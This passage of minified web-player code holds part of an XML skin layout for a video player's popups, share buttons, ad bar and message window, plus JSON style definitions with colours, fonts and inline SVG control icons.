id="AudioPopupItemRenderer" width="140" height="40" class="bs.player.plugin.skin.ui.renderer.LabelRenderer"> <bs:Box id="AudioPopupItemIndicator" top="15" left="15" width="10" height="10"/> <bs:Label id="AudioPopupItemLabel" left="35" top="12" height="20" width="100"/> </bs:LabelRenderer> </bs:ItemListScroll> </bs:Box> </bs:Box> \x3c!--VideoQualityPopup--\x3e <bs:Box id="VideoQualityPopup" width="200" bottom="0"> <bs:Box id="VideoQualityPopupContainer" left="30" right="30" top="10" bottom="0"> <bs:ItemListScroll id="VideoQualityPopupList" top="0" bottom="0" width="140"> <bs:LabelRenderer id="VideoQualityPopupItemRenderer" width="140" height="40" class="bs.player.plugin.skin.ui.renderer.LabelRenderer"> <bs:Box id="VideoQualityPopupItemIndicator" top="15" left="15" width="10" height="10"/> <bs:Label id="VideoQualityPopupItemLabel" left="35" top="12" height="20" width="100"/> </bs:LabelRenderer> </bs:ItemListScroll> </bs:Box> </bs:Box> \x3c!--ShareBox--\x3e <bs:HBox id="ShareBox" top="40" height="30" right="40" align="right" hideHeight="<175"> <bs:IconButton id="ShareButtonEmbed" width="30" height="30" hideWidth="<275"/> <bs:Spacer width="4" hideWidth="<275"/> <bs:IconButton id="ShareButtonMail" width="30" height="30" hideWidth="<240"/> <bs:Spacer width="4" hideWidth="<240"/> <bs:IconButton id="ShareButtonFacebook" width="30" height="30" hideWidth="<205"/> <bs:Spacer width="4" hideWidth="<205"/> <bs:IconButton id="ShareButtonTwitter" width="30" height="30" hideWidth="<170"/> <bs:Spacer width="4" hideWidth="<170"/> <bs:IconButton id="ShareButtonLinkedIn" width="30" height="30" hideWidth="<135"/> <bs:Spacer width="4" hideWidth="<135"/> </bs:HBox> \x3c!--BrandButton--\x3e <bs:Box id="brandButtonBox" top="40" left="40" bottom="40" right="40" mouseEnable="false" hideWidth="<400"> <bs:ImageButton id="BrandButton"/> </bs:Box> \x3c!--AdvertisementsHolder--\x3e <bs:Button id="AdvertisementsHolder" top="0" left="0" right="0" bottom="0" align="right" mouseEnable="false"> <bs:IconButton id="AdvertisementsPlayButton" centerX="0" centerY="10" percentWidth="0.1" height="72" /> <bs:Button id="AdvertisementsClick" top="0" left="0" bottom="0" right="0" mouseEnable="true" /> <bs:HBox id="AdvertisementsBar" height="38" top="10" left="10" right="10" mouseEnable="false"> <bs:Spacer width="10" mouseEnable="false"/> <bs:Label id="AdvertisementsLabel" top="10" width="72" mouseEnable="false"></bs:Label> <bs:Spacer width="10"/> <bs:Label id="AdvertisementsTime" top="10" width="54" mouseEnable="false"></bs:Label> <bs:Spacer percentWidth="1" mouseEnable="false"/> <bs:Label id="AdvertisementsCounter" top="10" width="24" mouseEnable="false"></bs:Label> <bs:Spacer width="10" mouseEnable="false"/> <bs:IconButton id="AdvertisementsCloseButton" top="9" width="20" height="20"></bs:IconButton> <bs:Spacer id="AdvertisementsCloseButtonSpacer" width="10" mouseEnable="false"/> </bs:HBox> <bs:IconButton id="AdvertisementsMuteButton" height="38" width="38" bottom="10" right="10" /> </bs:Button> \x3c!--MessageHolder--\x3e <bs:Box id="MessageHolder" top="0" left="0" right="0" bottom="0"> <bs:Box id="MessageWindow" width="400" height="240" centerX="0" centerY="0"> <bs:Label id="MessageTitle" top="10" left="30" right="50"></bs:Label> <bs:IconButton id="MessageClose" top="10" right="20" width="30" height="30"></bs:IconButton> <bs:Box id="MessageTitleBar" left="30" right="30" top="50" height="1"/> <bs:VBox id="MessageTextsWrapper" left="30" right="30" top="60" bottom="30"> <bs:Text id="MessageText" percentWidth="1"></bs:Text> <bs:Spacer height="10" mouseEnable="false"/> <bs:Text id="MessageTextDetails" percentWidth="1"></bs:Text> <bs:Spacer height="10" mouseEnable="false"/> <bs:Button id="MessageUserSingleActionButton" left="130" right="130" height="40" align="center" > <bs:Text id="MessageUserSingleActionButtonText" left="0" right="2" top="9" bottom="0" align="center"></bs:Text> </bs:Button> </bs:VBox> </bs:Box> </bs:Box> </bs:Skin> '),qc.skinName=this.getSkinNameFromLayout(),qc.skinStyles=JSON.parse('{"SubtitlePopupItemRenderer":{"normal":{"color":"COLOR_CONTROLS_1"},"selected":{"color":"COLOR_CONTROLS_0"},"over":{"color":"COLOR_BASE_0"}},"AdvertisementsPlayButton":{"normal":{"icon":"ICON_AD_PLAY"},"over":{"icon":"ICON_AD_PLAY_OVER"}},"VideoQualityPopupContainer":{"normal":{"color":"COLOR_CONTROLS_0","alpha":0.95}},"BARIOL_REGULAR":"Font_0f73f475b6be13bab873ca6ce0","ShareButtonLinkedIn":{"normal":{"shadow":{"color":"COLOR_SHADOW","alpha":1,"distance":0,"angle":0,"blur":4},"iconPadding":4,"icon":"ICON_SHARE_LINKEDIN"}},"ChannelsPopupItemTrack":{"normal":{"color":"#5b5b5b","borderRadius":2},"selected":{"color":"COLOR_BASE_0","borderRadius":2},"over":{"color":"COLOR_BASE_0","borderRadius":2}},"StartSplashDefaultPauseButton":{"normal":{"shadow":{"color":"COLOR_SHADOW","alpha":1,"distance":0,"angle":0,"blur":4},"icon":"ICON_PAUSE"}},"EndSplashCountdownImageContainer":{"normal":{"color":"COLOR_BASE_1"}},"EndSplashTilesItemInfoDuration":{"normal":{"fontColor":"COLOR_TEXT","fontFamily":"Font_0f73f475b6be13bab873ca6ce0","fontSize":11}},"ICON_SHARE_MAIL":"<?xml version=\\"1.0\\" standalone=\\"no\\"?><!DOCTYPE svg PUBLIC \\"-//W3C//DTD SVG 1.1//EN\\" \\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\\"><svg width=\\"100%\\" height=\\"100%\\" viewBox=\\"0 0 100 100\\" version=\\"1.1\\" xmlns=\\"http://www.w3.org/2000/svg\\" xmlns:xlink=\\"http://www.w3.org/1999/xlink\\" xml:space=\\"preserve\\" style=\\"fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;\\"><g id=\\"Layer2\\"><path d=\\"M7.97,26.428c2.441,1.312 36.241,19.468 37.499,20.144c1.259,0.676 2.889,1.002 4.531,1.002c1.643,0 3.271,-0.326 4.531,-1.002c1.258,-0.676 35.058,-18.831 37.498,-20.144c2.443,-1.311 4.755,-5.428 0.268,-5.428l-84.594,0c-4.484,0 -2.176,4.117 0.267,5.428ZM93.064,36.428c-2.773,1.447 -36.835,19.26 -38.533,20.144c-1.699,0.887 -2.889,1.002 -4.531,1.002c-1.642,0 -2.832,-0.115 -4.531,-1.002c-1.698,-0.884 -35.758,-18.697 -38.533,-20.144c-1.953,-1.017 -1.936,0.176 -1.936,1.098c0,0.922 0,36.679 0,36.679c0,2.096 2.792,4.795 4.959,4.795l80.082,0c2.167,0 4.959,-2.699 4.959,-4.795c0,0 0,-35.757 0,-36.679c0,-0.922 0.02,-2.115 -1.936,-1.098Z\\" style=\\"fill:#fff;fill-rule:nonzero;\\"/></g></svg>","ARROW_RIGHT":"<?xml version=\\"1.0\\" standalone=\\"no\\"?> <!DOCTYPE svg PUBLIC \\"-//W3C//DTD SVG 1.1//EN\\" \\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\\"> <svg width=\\"100%\\" height=\\"100%\\" viewBox=\\"0 0 100 100\\" version=\\"1.1\\" xmlns=\\"http://www.w3.org/2000/svg\\" xmlns:xlink=\\"http://www.w3.org/1999/xlink\\" xml:space=\\"preserve\\" style=\\"fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;\\"> <g> <path d=\\"M19.1969,11.5335L30.0125,0.905141L79.9721,50L30.0125,99.0949L19.1969,88.4665L58.3409,50L19.1969,11.5335Z\\" /> </g> </svg> ","BufferSpinner":{"normal":{"shadow":{"color":"COLOR_SHADOW","alpha":1,"distance":0,"angle":0,"blur":4},"rotationSpeed":45,"rotationTimeInterval":64,"icon":"ICON_SPINNER","iconColor":"COLOR_TEXT"}},"ICON_PIP":"<?xml version=\\"1.0\\" encoding=\\"utf-8\\"?> <svg width=\\"100px\\" height=\\"100px\\" viewBox=\\"0 0 100 100\\" version=\\"1.1\\" xmlns=\\"http://www.w3.org/2000/svg\\"> <g id=\\"pip_enter\\" stroke=\\"none\\" stroke-width=\\"1\\" fill=\\"none\\" fill-rule=\\"evenodd\\" style=\\"\\" transform=\\"matrix(4.166667, 0, 0, 4.166667, 0, 0)\\"> <path d=\\"M 4.48 12.674 L 4.437 17.544 C 4.426 17.574 13.256 17.544 13.216 17.534 L 13.267 12.631 C 13.287 12.612 5.408 12.708 4.48 12.674 Z M 21.014 3.033 L 3.014 3.033 C 1.914 3.033 1.014 3.933 1.014 5.033 L 0.988 18.983 C 0.946 20.161 1.622 20.927 2.938 20.943 L 3.014 5.033 L 21.014 5.033 L 21.014 19.033 L 2.974 18.961 L 2.924 20.932 L 21.083 20.966 C 22.183 20.966 23.014 20.133 23.014 19.033 L 23.014 5.033 C 23.014 3.933 22.114 3.033 21.014 3.033 Z\\" fill=\\"#ffffff\\"/> <rect id=\\"bounds\\" x=\\"0\\" y=\\"0\\" width=\\"24\\" height=\\"24\\"/> </g> </svg>","PictureInPictureButton":{"normal":{"iconPadding":10,"color":"COLOR_CONTROLS_1","alpha":0.88,"icon":"ICON_PIP"},"over":{"color":"COLOR_CONTROLS_2","alpha":0.95}},"ShareButtonTwitter":{"normal":{"shadow":{"color":"COLOR_SHADOW","alpha":1,"distance":0,"angle":0,"blur":4},"iconPadding":4,"icon":"ICON_SHARE_TWITTER"}},"COLOR_BACKGROUND":"@rgb:#222222","ChannelsList":{"scroll":{"normal":{"color":"COLOR_CONTROLS_1","alpha":0.75,"width":6}},"track":{"normal":{"color":"COLOR_BASE_0","width":6}}},"ARROW_DOWN":"<?xml version=\\"1.0\\" standalone=\\"no\\"?> <!DOCTYPE svg PUBLIC \\"-//W3C//DTD SVG 1.1//EN\\" \\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\\"> <svg width=\\"100%\\" height=\\"100%\\" viewBox=\\"0 0 100 100\\" version=\\"1.1\\" xmlns=\\"http://www.w3.org/2000/svg\\" xmlns:xlink=\\"http://www.w3.org/1999/xlink\\" xml:space=\\"preserve\\" style=\\"fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;\\"> <g> <path d=\\"M88.2593,21.6257L98.8307,31.7626L49.9998,78.5861L1.16927,31.7626L11.7406,21.6257L49.9998,58.3126L88.2593,21.6257Z\\"/> </g> </svg> ","ProgressPopupBackground":{"normal":{"color":"COLOR_CONTROLS_0"}},"ICON_VOLUME":"<?xml version=\\"1.0\\" standalone=\\"no\\"?> <!DOCTYPE svg PUBLIC \\"-//W3C//DTD SVG 1.1//EN\\" \\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\\"> <svg width=\\"100%\\" height=\\"100%\\" viewBox=\\"0 0 100 100\\" version=\\"1.1\\" xmlns=\\"http://www.w3.org/2000/svg\\" xmlns:xlink=\\"http://www.w3.org/1999/xlink\\" xml:space=\\"preserve\\" style=\\"fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;\\"> <g id=\\"volume\\"> <g> <path d=\\"M74.9192,5.30841C73.3952,4.6786 71.64,5.03023 70.4575,6.2094L45.7009,31.1234L26.6315,31.1234C24.3606,31.1234 22.5351,32.9558 22.5351,35.22L22.5351,64.7868C22.5351,67.0511 24.3606,68.8833 26.6315,68.8833L45.6103,68.8833L70.4709,93.7975C71.2546,94.5845 72.3099,95 73.3683,95C73.8908,95 74.4335,94.8995 74.9326,94.6885C76.47,94.0587 77.4649,92.5614 77.4649,90.9069L77.4649,9.09315C77.4614,7.43532 76.4566,5.93803 74.9192,5.30841Z\\" style=\\"fill:white;fill-rule:nonzero;\\"/> </g> </g> </svg> ","ChannelsPopupSeparator":{"normal":{"color":"COLOR_BASE_0"}},"EndSplashSocialFacebook":{"normal":{"shadow":{"color":"COLOR_SHADOW","alpha":1,"distance":0,"angle":0,"blur":4},"iconPadding":4,"icon":"ICON_SHARE_FACEBOOK"}},"ChannelsPopupItemLabel":{"normal":{"fontColor":"COLOR_TEXT","fontFamily":"Font_0f73f475b6be13bab873ca6ce0","fontSize":12}},"ICON_AIRPLAY":"<?xml version=\\"1.0\\" encoding=\\"utf-8\\"?> <svg width=\\"100%\\" height=\\"100%\\" viewBox=\\"0 0 100 100\\" version=\\"1.1\\" style=\\"fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;\\" xmlns=\\"http://www.w3.org/2000/svg\\"> <g id=\\"airplay\\" style=\\"fill:#ffffff\\" transform=\\"matrix(1.692047, 0, 0, 1.901141, -56.175961, -72.623573)\\"> <path d=\\"M81,88.8c0.4,0.5,0.4,1.3-0.1,1.7c-0.2,0.2-0.5,0.3-0.8,0.3H44.9c-0.7,0-1.2-0.5-1.2-1.2 c0-0.3,0.1-0.6,0.3-0.8l17.5-20.1c0.5-0.6,1.3-0.6,1.9-0.1c0,0,0.1,0.1,0.1,0.1L81,88.8z M76.9,77.7l-2.8-3.3h10.5 c0.9,0.1,1.7-0.1,2.5-0.4c0.5-0.3,1-0.7,1.2-1.2c0.4-0.8,0.5-1.7,0.4-2.5V45.8c0.1-0.9-0.1-1.7-0.4-2.5c-0.3-0.5-0.7-1-1.2-1.2 c-0.8-0.4-1.7-0.5-2.5-0.4h-44c-0.9-0.1-1.7,0.1-2.5,0.4c-0.5,0.3-1,0.7-1.2,1.2c-0.4,0.8-0.5,1.7-0.4,2.5v24.4 c-0.1,0.9,0.1,1.7,0.4,2.5c0.3,0.5,0.7,1,1.2,1.2c0.8,0.4,1.7,0.5,2.5,0.4h10.5l-2.8,3.3h-6.7c-3,0-4-0.3-5-0.9 c-1.1-0.6-1.9-1.4-2.5-2.5c-0.6-1.1-0.9-2.1-0.9-5V46.7c0-3,0.3-4,0.9-5.1c0.6-1.1,1.4-1.9,2.5-2.5c1.1-0.6,2.1-0.9,5-0.9h42.2 c3,0,4,0.3,5.1,0.9c1.1,0.6,1.9,1.4,2.5,2.5c0.6,1.1,0.9,2.1,0.9,5.1v22.5c0,3-0.3,4-0.9,5c-0.6,1.1-1.4,1.9-2.5,2.5 c-1.1,0.6-2.1,0.9-5.1,0.9L76.9,77.7z\\" transform=\\"matrix(1, 0, 0, 1, 0, 0)\\" style=\\"overflow: visible;\\"/> </g> </svg>","ICON_CLOSE":"<svg xmlns=\\"http://www.w3.org/2000/svg\\" xmlns:xlink=\\"http://www.w3.org/1999/xlink\\" version=\\"1.1\\" x=\\"0px\\" y=\\"0px\\" viewBox=\\"0 0 100 100\\" enable-background=\\"new 0 0 100 100\\" xml:space=\\"preserve\\"> <g stroke=\\"#FFF\\"> <circle fill=\\"none\\" stroke-width=\\"6\\" stroke-miterlimit=\\"10\\" cx=\\"50\\" cy=\\"50\\" r=\\"47\\"></circle> <line fill=\\"none\\" stroke-width=\\"6\\" stroke-miterlimit=\\"10\\" x1=\\"71.214\\" y1=\\"71.213\\" x2=\\"28.787\\" y2=\\"28.787\\"></line> <line fill=\\"none\\" stroke-width=\\"6\\" stroke-miterlimit=\\"10\\" x1=\\"28.787\\" y1=\\"71.213\\" x2=\\"71.214\\" y2=\\"28.787\\"></line> </g> </svg>","AirPlayButton":{"normal":{"iconPadding":10,"color":"COLOR_CONTROLS_1","alpha":0.88,"icon":"ICON_AIRPLAY"},"over":{"color":"COLOR_CONTROLS_2","alpha":0.95}},"EndSplashTilesItemImageContainer":{"normal":{"color":"COLOR_BASE_1"}},"ProgressPopupLabel":{"normal":{"fontColor":"COLOR_TEXT","fontFamily":"Font_0f73f475b6be13bab873ca6ce0","fontSize":12}},"SeriesPopupItemLabel":{"normal":{"fontColor":"COLOR_TEXT","fontFamily":"Font_0f73f475b6be13bab873ca6ce0","fontSize":12},"selected":{"fontColor":"COLOR_BASE_1","fontFamily":"Font_0f73f475b6be13bab873ca6ce0","fontSize":12}},"ProgressbarIndicator":{"normal":{"color":"COLOR_BASE_1","borderRadius":7}},"POSSIBLE_STATES":["normal","over","disabled","selected","play","pause","reload"],"AudioPopupItemIndicator":{"normal":{"color":"COLOR_CONTROLS_0","borderRadius":6},"selected":{"color":"COLOR_PROGRESS_1"},"over":{"color":"COLOR_BASE_1"}},"SubtitleList":{"scroll":{"normal":{"color":"COLOR_CONTROLS_1","width":6}},"track":{"normal":{"color":"COLOR_CONTROLS_2","width":6}}},"VolumeTrack":{"normal":{"color":"COLOR_PROGRESS_0"}},"ControlbarTimeLabel":{"normal":{"fontColor":"COLOR_TEXT","fontFamily":"Font_0f73f475b6be13bab873ca6ce0","fontSize":12}},"MessageTitle":{"normal":{"fontColor":"COLOR_TEXT","fontFamily":"Font_0f73f475b6be13bab873ca6ce0","fontSize":24}},"ChannelsPopupItemIcon":{"normal":{"iconPadding":0,"icon":"ICON_HOME"},"selected":{"iconPadding":0,"icon":"ICON_HOME_OVER"},"over":{"iconPadding":0,"icon":"ICON_HOME_OVER"}},"ICON_PAUSE":"<?xml version=\\"1.0\\" standalone=\\"no\\"?> <!DOCTYPE svg PUBLIC \\"-//W3C//DTD SVG 1.1//EN\\" \\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\\"> <svg width=\\"100%\\" height=\\"100%\\" viewBox=\\"0 0 100 100\\" version=\\"1.1\\" xmlns=\\"http://www.w3.org/2000/svg\\" xmlns:xlink=\\"http://www.w3.org/1999/xlink\\" xml:space=\\"preserve\\" style=\\"fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;\\"> <g id=\\"pause\\"> <g> <path d=\\"M72.5,5C66.1074,5 60.9286,6.96586 60.9286,13.3571L60.9286,86.6429C60.9286,93.0341 66.1074,95 72.5,95C78.8913,95 84.0714,93.0341 84.0714,86.6429L84.0714,13.3571C84.0714,6.96586 78.8913,5 72.5,5Z\\" style=\\"fill:white;fill-rule:nonzero;\\"/> <path d=\\"M27.5,5C21.1074,5 15.9286,6.96586 15.9286,13.3571L15.9286,86.6429C15.9286,93.0341 21.1074,95 27.5,95C33.8913,95 39.0714,93.0341 39.0714,86.6429L39.0714,13.3571C39.0714,6.96586 33.8913,5 27.5,5Z\\" style=\\"fill:white;fill-rule:nonzero;\\"/> </g> </g> </svg> ","MessageWindow":{"normal":{"shadow":{"color":"COLOR_SHADOW","alpha":1,"distance":0,"angle":0,"blur":8},"color":"COLOR_BACKGROUND","borderRadius":8},"alert":{"shadow":{"color":"COLOR_SHADOW","alpha":1,"distance":0,"angle":0,"blur":8},"color":"#DD0000","borderRadius":8}},"ARROW_LEFT":"<?xml version=\\"1.0\\" standalone=\\"no\\"?> <!DOCTYPE svg PUBLIC \\"-//W3C//DTD SVG 1.1//EN\\" \\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\\"> <svg width=\\"100%\\" height=\\"100%\\" viewBox=\\"0 0 100 100\\" version=\\"1.1\\" xmlns=\\"http://www.w3.org/2000/svg\\" xmlns:xlink=\\"http://www.w3.org/1999/xlink\\" xml:space=\\"preserve\\" style=\\"fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;\\"> <g> <path d=\\"M80.3876,88.4665L69.572,99.0949L19.6124,50L69.572,0.905141L80.3876,11.5335L41.2436,50L80.3876,88.4665Z\\"/> </g> </svg> ","AudioPopupItemLabel":{"normal":{"fontColor":"COLOR_TEXT","fontFamily":"Font_0f73f475b6be13bab873ca6ce0","fontSize":14}},"SeriesPopupPlayButton":{"normal":{"icon":"SERIES_PLAY"}},"ICON_QUALITY":"<svg width=\\"100%\\" height=\\"100%\\" viewBox=\\"0 0 100 100\\" version=\\"1.1\\" xmlns=\\"http://www.w3.org/2000/svg\\" xmlns:xlink=\\"http://www.w3.org/1999/xlink\\" xml:space=\\"preserve\\" style=\\"fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;\\"> <g> <path d=\\"M98.821,43.995l-12.276,-5.378c-0.659,-2.219 -1.559,-4.378 -2.659,-6.437l4.858,-12.456c0.3,-0.739 0.12,-1.579 -0.439,-2.139l-5.918,-5.917c-0.56,-0.56 -1.419,-0.74 -2.139,-0.44l-12.415,4.898c-2.059,-1.1 -4.218,-1.979 -6.477,-2.659l-5.338,-12.255c-0.3,-0.74 -1.02,-1.2 -1.82,-1.2l-8.376,0c-0.8,0 -1.52,0.46 -1.84,1.2l-5.338,12.215c-2.179,0.7 -4.338,1.579 -6.437,2.659l-12.435,-4.858c-0.74,-0.3 -1.579,-0.12 -2.139,0.44l-5.918,5.917c-0.56,0.56 -0.739,1.4 -0.459,2.139l4.878,12.476c-1.08,2.059 -1.96,4.198 -2.659,6.417l-12.276,5.378c-0.719,0.32 -1.199,1.039 -1.199,1.819l0,8.337c0,0.8 0.48,1.519 1.199,1.819l12.276,5.378c0.699,2.219 1.599,4.378 2.659,6.437l-4.878,12.455c-0.28,0.74 -0.101,1.58 0.459,2.16l5.918,5.857c0.56,0.56 1.399,0.74 2.139,0.44l12.435,-4.818c2.099,1.079 4.258,1.959 6.437,2.659l5.338,12.235c0.32,0.72 1.04,1.199 1.84,1.199l8.376,0c0.8,0 1.52,-0.479 1.82,-1.219l5.338,-12.255c2.259,-0.68 4.418,-1.559 6.477,-2.659l12.415,4.858c0.74,0.3 1.579,0.12 2.139,-0.44l5.918,-5.857c0.559,-0.58 0.739,-1.42 0.439,-2.16l-4.858,-12.455c1.1,-2.059 2,-4.218 2.659,-6.437l12.276,-5.378c0.719,-0.3 1.179,-1.019 1.179,-1.819l0,-8.337c0,-0.78 -0.46,-1.499 -1.179,-1.819Zm-48.821,28.488c-12.395,0 -22.491,-10.096 -22.491,-22.491c0,-12.415 10.096,-22.491 22.491,-22.491c12.415,0 22.491,10.076 22.491,22.491c0,12.395 -10.076,22.491 -22.491,22.491Z\\" style=\\"fill:#fff;fill-rule:nonzero;\\"/> </g> </svg>","VolumePopup":{"normal":{"color":"COLOR_CONTROLS_0","alpha":0.95}},"EndSplashCountdownLabel":{"normal":{"fontResponsive":{"min":8,"max":20,"ratio":21},"fontColor":"COLOR_TEXT","fontFamily":"Font_0f73f475b6be13bab873ca6ce0"}},"ICON_SHARE_FACEBOOK":"<?xml version=\\"1.0\\" standalone=\\"no\\"?><!DOCTYPE svg PUBLIC \\"-//W3C//DTD SVG 1.1//EN\\" \\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\\"><svg width=\\"100%\\" height=\\"100%\\" viewBox=\\"0 0 100 100\\" version=\\"1.1\\" xmlns=\\"http://www.w3.org/2000/svg\\" xmlns:xlink=\\"http://www.w3.org/1999/xlink\\" xml:space=\\"preserve\\" style=\\"fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;\\"><g id=\\"Layer2\\"><path id=\\"Facebook\\" d=\\"M38.0779,22.4301c0,2.26804 0,12.3912 0,12.3912l-9.07822,0l0,15.1521l9.07822,0l0,45.0266l18.6486,0l0,-45.0253l12.5141,0c0,0 1.172,-7.26529 1.7401,-15.2092c-1.62879,0 -14.1837,0 -14.1837,0c0,0 0,-8.81498 0,-10.3601c0,-1.54843 2.03326,-3.63129 4.04288,-3.63129c2.00585,0 6.23935,0 10.1604,0c0,-2.06297 0,-9.191 0,-15.7741c-5.23454,0 -11.1897,0 -13.8148,0c-19.5686,-0.00104624 -19.1077,15.1661 -19.1077,17.4301Z\\" style=\\"fill:#fff;fill-rule:nonzero;\\"/></g></svg>","EndSplashCountdownCounter":{"normal":{"fontResponsive":{"min":24,"max":48,"ratio":12},"fontColor":"COLOR_TEXT","fontFamily":"Font_0f73f475b6be13bab873ca6ce0"}},"VideoQualityPopupList":{"scroll":{"normal":{"color":"COLOR_CONTROLS_1","width":6}},"track":{"normal":{"color":"COLOR_CONTROLS_2","width":6}}},"VideoQualityButton":{"normal":{"iconPadding":10,"color":"COLOR_CONTROLS_1","alpha":0.88,"icon":"ICON_QUALITY"},"over":{"color":"COLOR_CONTROLS_2","alpha":0.95}},"ProgressbarMarker":{"normal":{"shadow":{"color":"COLOR_SHADOW","alpha":1,"distance":0,"angle":0,"blur":4},"color":"COLOR_PROGRESS_2","alpha":1,"borderRadius":6},"active":{"color":"COLOR_PROGRESS_1","alpha":1}},"ICON_MUTE":"<?xml version=\\"1.0\\" standalone=\\"no\\"?> <!DOCTYPE svg PUBLIC \\"-//W3C//DTD SVG 1.1//EN\\" \\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\\"> <svg width=\\"100%\\" height=\\"100%\\" viewBox=\\"0 0 100 100\\" version=\\"1.1\\" xmlns=\\"http://www.w3.org/2000/svg\\" xmlns:xlink=\\"http://www.w3.org/1999/xlink\\" xml:space=\\"preserve\\" style=\\"fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;\\"> <g id=\\"Layer24\\"> <g id=\\"mute\\"> <g id=\\"volume\\"> <g> <path d=\\"M74.9192,5.30841C73.3952,4.6786 71.64,5.03023 70.4575,6.2094L45.7009,31.1234L26.6315,31.1234C24.3606,31.1234 22.5351,32.9558 22.5351,35.22L22.5351,64.7868C22.5351,67.0511 24.3606,68.8833 26.6315,68.8833L45.6103,68.8833L70.4709,93.7975C71.2546,94.5845 72.3099,95 73.3683,95C73.8908,95 74.4335,94.8995 74.9326,94.6885C76.47,94.0587 77.4649,92.5614 77.4649,90.9069L77.4649,9.09315C77.4614,7.43532 76.4566,5.93803 74.9192,5.30841Z\\" style=\\"fill:white;fill-rule:nonzero;\\"/> </g> </g> <path d=\\"M12.4687,5.41781L5.41781,12.4687L87.5313,94.5822L94.5822,87.5313L12.4687,5.41781Z\\" style=\\"fill:white;\\"/> <path d=\\"M94.5822,12.4687L87.5313,5.41781L5.41781,87.5313L12.4687,94.5822L94.5822,12.4687Z\\" style=\\"fill:white;\\"/> </g> </g> </svg> ","AudioPopupContainer":{"normal":{"color":"COLOR_CONTROLS_0","alpha":0.95}},"COLORS_SHADE_MAP":{"COLOR_PROGRESS_2":-0.3,"COLOR_PROGRESS_1":-0.1,"COLOR_CONTROLS_1":0,"COLOR_CONTROLS_2":-0.2,"COLOR_CONTROLS_0":-0.2},"VideoQualityPopupItemIndicator":{"normal":{"color":"COLOR_CONTROLS_0","borderRadius":6},"selected":{"color":"COLOR_PROGRESS_1"},"over":{"color":"COLOR_BASE_1"}},"SeriesPopupLeftButton":{"normal":{"icon":"ARROW_LEFT"}},"EndSplashTilesItemInfoTitle":{"normal":{"fontColor":"COLOR_TEXT","fontFamily":"Font_0f73f475b6be13bab873ca6ce0","fontSize":12}},"COLOR_PROGRESS_2":"@rgb:#888888","EndSplashCountdownButtonIcon":{"normal":{"iconPadding":2,"icon":"ICON_PLAY"}},"SubtitlePopupItemLabel":{"normal":{"fontColor":"COLOR_TEXT","fontFamily":"Font_0f73f475b6be13bab873ca6ce0","fontSize":14}},"ChannelsPopupItemRenderer":{"normal":{"color":"COLOR_CONTROLS_1"},"selected":{"color":"COLOR_CONTROLS_0"},"over":{"color":"COLOR_BASE_0"}},"EndSplashSocialLinkedIn":{"normal":{"shadow":{"color":"COLOR_SHADOW","alpha":1,"distance":0,"angle":0,"blur":4},"iconPadding":4,"icon":"ICON_SHARE_LINKEDIN"}},"ProgressbarSegmentBackground":{"normal":{"shadow":{"color":"COLOR_SHADOW","alpha":1,"distance":0,"angle":0,"blur":4},"color":"COLOR_PROGRESS_2","alpha":1}},"ProgressbarSegmentProgress":{"normal":{"color":"COLOR_PROGRESS_1","alpha":1}},"VideoQualityPopupItemLabel":{"normal":{"fontColor":"COLOR_TEXT","fontFamily":"Font_0f73f475b6be13bab873ca6ce0","fontSize":14}},"ICON_SUBTITLES":"<?xml version=\\"1.0\\" standalone=\\"no\\"?> <!DOCTYPE svg PUBLIC \\"-//W3C//DTD SVG 1.1//EN\\" \\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\\"> <svg width=\\"100%\\" height=\\"100%\\" viewBox=\\"0 0 100 100\\" version=\\"1.1\\" xmlns=\\"http://www.w3.org/2000/svg\\" xmlns:xlink=\\"http://www.w3.org/1999/xlink\\" xml:space=\\"preserve\\" style=\\"fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;\\"> <g id=\\"subtitles\\"> <path id=\\"closed-caption\\" d=\\"M85,10L15,10C9.5,10 5,14.5 5,20L5,80C5,85.5 9.5,90 15,90L85,90C90.5,90 95,85.5 95,80L95,20C95,14.5 90.5,10 85,10ZM45,45L37.5,45L37.5,42.5L27.5,42.5L27.5,57.5L37.5,57.5L37.5,55L45,55L45,60C45,63 43,65 40,65L25,65C22,65 20,63 20,60L20,40C20,37 22,35 25,35L40,35C43,35 45,37 45,40L45,45ZM80,45L72.5,45L72.5,42.5L62.5,42.5L62.5,57.5L72.5,57.5L72.5,55L80,55L80,60C80,63 78,65 75,65L60,65C57,65 55,63 55,60L55,40C55,37 57,35 60,35L75,35C78,35 80,37 80,40L80,45Z\\" style=\\"fill:white;fill-rule:nonzero;\\"/> </g> </svg> ","ICON_PLAYLIST":"<?xml version=\\"1.0\\" standalone=\\"no\\"?> <!DOCTYPE svg PUBLIC \\"-//W3C//DTD SVG 1.1//EN\\" \\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\\"> <svg width=\\"100%\\" height=\\"100%\\" viewBox=\\"0 0 100 100\\" version=\\"1.1\\" xmlns=\\"http://www.w3.org/2000/svg\\" xmlns:xlink=\\"http://www.w3.org/1999/xlink\\" xml:space=\\"preserve\\" style=\\"fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;\\"> <g 